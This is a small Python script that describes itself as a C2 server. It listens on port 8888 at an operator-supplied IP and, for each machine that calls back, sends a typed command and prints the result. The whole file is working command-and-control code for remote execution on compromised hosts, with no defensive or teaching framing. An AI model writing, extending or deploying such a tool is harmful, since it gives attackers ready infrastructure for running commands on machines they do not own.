# imports
import asyncio
import sys

# declared some values
server_ip = input("Enter Ip for recive connection >> ")
port = 8888


# send command to the connection machine
async def send_command(reader, writer):
    addr, port = writer.get_extra_info('peername')
    print(f"[*] Received callback from {addr!r}")

    print("[+] Command to run")
    command = input(f"{addr}> ")
    message = command.encode()
    writer.write(message)
    await writer.drain()
    print("[*] Command Sent: " + str(command))

    try:
        results = await reader.read(1024)
        output = results.decode().strip()
        print(f"[+] Results from {addr}" + "\n" + str(output) + "\n")
        writer.close()
    except ConnectionResetError as e:
        print('[-] Connection Lost')


# main function
async def main():
    server = await asyncio.start_server(send_command, server_ip, port)

    addr = server.sockets[0].getsockname()
    print(f'** C2 Serving on {addr} **')

    async with server:
        await server.serve_forever()

try:
    asyncio.run(main())
except KeyboardInterrupt:
    print("\n[-] Received exit, exiting")